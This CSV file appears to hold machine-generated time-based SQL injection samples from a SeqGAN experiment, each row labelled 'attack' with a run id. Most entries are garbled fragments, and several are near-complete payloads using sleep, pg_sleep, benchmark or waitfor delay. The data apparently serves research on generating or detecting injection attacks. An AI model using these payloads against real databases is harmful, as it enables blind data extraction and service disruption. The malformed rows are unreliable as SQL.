label,payload,family,payload_type,method,run_id,sample_index
attack,"  )   or pg_sleep  =  7739  --  10000000,relrv",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,13
attack," or sleep  (  _  =  5  7739   (  10000000,M",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,14
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ia' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,15
attack, or if 3885  (  --  =  9443  _TIME,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,16
attack,  )    )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,17
attack,1    ))    )  rlt_  _  5873  benchmark_T_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,18
attack,1   )    )or sleep  (  50000007629   5873  3114  =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,19
attack,1%'||  (  select ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,20
attack,", if delay not  =  6784  5  _TIME_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,21
attack,or benchmark  =  5000000or  =  IMD  benchmark  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,22
attack,waitfor  if not  benchmark  where  5000000  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,23
attack,1% waitfor 6784  =  substring   4287 vDi  (  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,24
attack,"; if "" like ""  =  =  substring  )lM_  _  _",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,25
attack,", where 2388  (  10000000  5000000     2657  )     10000000  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,26
attack,",or pg_sleep  =  #  10000000MD  (  benchmarklrlt",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,27
attack,1'||  (  select 'weiselect sleep  (  select  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,28
attack,"x if  benchmark  (  5  )  10000000,ME__T  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,29
attack,--7629 3885  =  _#q4240_TM__  not  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,30
attack,1%%'  )   and pg_sleep  =  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,31
attack, sleep  (   __TIME___E____T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,32
attack,",i  where 4240  =   5466l",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,33
attack,)    )%   a if '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,34
attack,L)   or 5702  5000000  =  ___TIME__,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,35
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,36
attack,"1%')   or sleep  (  5  10000000,M3885  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,37
attack,;waitfor if(v 2388  (  10000000  =        =  sleep,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,38
attack,1   )or benchmark  TIME  4287  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,39
attack, or or)     (  _TIME  5000000MIME,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,40
attack,;waitfor 5702 from   (  select hwhere sleep  (  IM,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,41
attack,""" or not  5000000  (  substring  1  )  benchmark  5  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,42
attack,"1' where where ""  )   or sleep  (  __TIME__  )    =  ""  (  select benchmark  (  =  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,43
attack,'   )    )    rlike sleep  (  5  )   and    (    (   ')           as eiwhere ellt  =  benchmark,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,44
attack,"""  )   or sleep  (  __TIME__  )    =  ""r       =  benchmark (  (  10000000,benchmark  --  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,45
attack,",k   if    ( if not  =  (  _TIME",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,46
attack, from sleep  =     )     )      6784    =  =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,47
attack,"sleep  (  3114  D  _  )   (  (  4287  10000000,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,48
attack,1'     )   and--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,49
attack,1' k   )     )and--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,50
attack,"1'||  (  select 's    =  M5873  )  ,  (  )  10000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,51
attack, from      (  )       #   (   10000000  8781  _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,52
attack,; or   (  =  ___  (    _)  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,53
attack,waitfor      (  10000000ME_T   )as from  (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,54
attack,1   )     or 7260  (     =  =  sleep  _T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,55
attack,"1%%,,""  5  )  (  )   )    a where",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,56
attack,    )   )    )    orland 1361  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,57
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "" pg_sleep  =  10000000,M(  (  5000000 benchmark  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,58
attack,    (  substring  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,59
attack,; from   )    )    )  =  substring--)  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,60
attack,waitfor *   (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,61
attack,1%'  =  )  6784  (  select pg_sleep  =      ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,62
attack,"m where z@;' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||' not  7629  (         )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,63
attack,1%if and sleep  (  sleep  =  #uMD5  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,64
attack,"1%' waitfor delay '""  ;; and 4240  (  ___T   _",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,65
attack,1'||  (  select 'lcttrs  D1e=  substring   select' from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,66
attack,1'  =__TIME__  )  and   s  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,67
attack,"""  _T)   )       )    )n when  5000000)  l",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,68
attack,",M  =   benchmark  (  =  7260  5000000_  (  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,69
attack, xwaitfor 10000000 and  (    )  sleep  10000000MDu),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,70
attack,"if  0x4c4d6142'  )   or pg_sleep  (  5  10000000,mmd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,71
attack,--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,72
attack, sleep  (  )   benchmark  =  )  _TTI  50000005000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,73
attack,"1'||  (  select 'Mrv  =_  benchmark  5000000_  (  10000000,Db",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,74
attack, not  =  #  5  (  5_  (  0x4c4d6142     (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,75
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,76
attack,"""   )    )or pg_sleep  (  10000000Mt_E_TIM",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,77
attack,1   )    )    or where  (    sleep  )  sleep  _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,78
attack,1%' or 8781  (  6272      =  benchmark  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,79
attack,"1'||  (  select 'sv' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||' where waitfor where where  (  or pg_sleep  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,80
attack,"1""  )   )    )    as  @vovcrvi",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,81
attack,-- waitfor)      6784  (       )    select where not  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,82
attack,""")   )    or benchmark  (  )   )  5000000#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,83
attack,"1   or &  ,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,84
attack,"# if""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ba ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,85
attack,1 ' waitfor delay ' cm  )   k      # sleep  (  TI,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,86
attack, )  sleep  =  6456  )  _TIME_  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,87
attack,"""   or pg_sleep  _____TIME__  10000000  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,88
attack,or 4240_  5000000l_TIME_  (  _  _  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,89
attack,1'||  (  select '   (  substring  5873      )l  (  benchmark  5,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,90
attack,11' waitfor delay ' 1%%   )    asfbwc,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,91
attack, pg_sleep  =  7260  5702  (    substring  __  2657  5,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,92
attack,1'   )    )  ;q 4287  (  =  =  5000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,93
attack,   4287 and sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,94
attack,1'||  (  select 'w sleep  5702(  (  (       _T; ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,95
attack, ) sleep(  )  (  )  benchmark  (  )  __,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,96
attack,1'||  (  select ' benchmark  benchmark  5  (  select benchmark  (  10000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,97
attack,", delay t  not  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,98
attack,    (  5702 where *  (   and sleep  benchmark  6272  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,99
attack,", where 6784      (  #l",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,100
attack,; if % k not  #slrlt  (  6272,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,101
attack,"   )     a     aloll , '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,102
attack,1 2840)   )  or sleep  (  5873  _TIM  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,103
attack, --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,104
attack,"1   7739)   or sleep    =  5000000,md5  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,105
attack,1   )    or *  (    _TIME    0x4c4d6142--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,106
attack,", )   8594  substring not  (  ImMD5  8781  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,107
attack,"1'  )   orx sleep  (  D,Mu where 8594",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,108
attack,"1%"" where pg_sleep  (  select  10000000,5  =  _T",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,109
attack," waitfor l  (  =  =  __    I,ME_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,110
attack,",baorwaitfor from sleep  --  )  (  select,'  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,111
attack,'sysadmin',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,112
attack,; where 6784  ) q)   ;,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,113
attack,waitfor from where from  (   selectq 2388o6784@vdv,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,114
attack,"; ,, ""  )   rlike sleep  (  5  )   and   (  ""   (   s not  )  (  (    (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,115
attack,k   ;'||  (  select 'isu waitfor  select not  (  )     select,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,116
attack,"1""   )    )    or   :zwhere where @pp'sa'_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,117
attack,; delay sleep  (  5000000  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,118
attack,1'||  (  select '   )    or  pg_sleep_  )    4287  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,119
attack,waitfor delay xvd p_  (  6272  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,120
attack,1 orlt  (  _  IMTME__  select  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,121
attack,"1'||  (  select '""  )   )     or pg_sleep  (  =  #   (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,122
attack,"""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ws where =  (  '  _TIME___",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,123
attack,"; from   =  =  ,m     =  10000000  benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,124
attack,",waitfor from where  (  (  (  (  I,1   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,125
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ei   or 8514  (  _TIME   E__",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,126
attack,' waitfor delay 'or and sleep  (  5  5  )  '   )    )    rlike sleep  (  5  )   and    (    (   '  =  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,127
attack,' waitfor delay ';waitfor from--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,128
attack,"1'||  (  select '' waitfor delay 'like"" where 4287  =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,129
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "" if where 7629  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,130
attack,1% delay @vvwhere if or sleep  )    =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,131
attack,1%;pg_sleep   ) )   or    sleep  (    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,132
attack,"waitfor  delay not  (  10000000,MD  5waitfor  (  6784",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,133
attack,a    1%ls from 2388  (  sleep  __TIM,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,134
attack,1 6456  select      (  (  (   select benchmark  (  _,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,135
attack,"   )s""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """" or pg_sleep  (  0x4c4d6142(  benchmark  (  5000000",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,136
attack,",1'||  (  select ' 6272(  )    (  (    =      T pg_sleep  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,137
attack,""" or benchmark  (  10000000MD5  select  (  5000000,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,138
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,139
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%vbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'  or  pg_sleep  (  select from  ,",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,140
attack,waitforvs from if  2388  =  5  =  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,141
attack,or sleep  1    )  =  sleep  _  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,142
attack,1%  6784 dll  (  # 4240 from not  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,143
attack,"or sleep  (  =  # --  m  10000000,E_  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,144
attack,7739 benchmark  =  substring pg_sleep  =  5000000 sleep  (  sleep  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,145
attack,or sleep  (    _T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,146
attack,",delay delay delay from  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,147
attack,"waitfor sleep  (  _TIMDE e,mrpob",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,148
attack,N)    or sleep  (  ;  )_      )  _T_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,149
attack,1' 2657  (  5000000 4287  (  (  select 2840  T,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,150
attack," 50  (  )  (  10000000,mbenchmark  (  )  5466  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,151
attack,", sleep  (  select Qselect  '0:0:10'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,152
attack,%' k       or benchmark  (  10000000  __  _=  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,153
attack, from where sleep    (  (  5000000__T_    10000000,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,154
attack,1 ; 5466  (  3114  (  6784  =  benchmark  #_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,155
attack,",Mwi  (  selectselect 2657  =u--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,156
attack,1361   )   6784  (  _  5000000uor benchmark  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,157
attack,";not   ;1y, (  =  =  1   )7260  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,158
attack,"  )   )    or pg_sleep  5000000,uTIM_TIME",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V5__sql_aware__len20__gpre60__reward_on__seed88,159
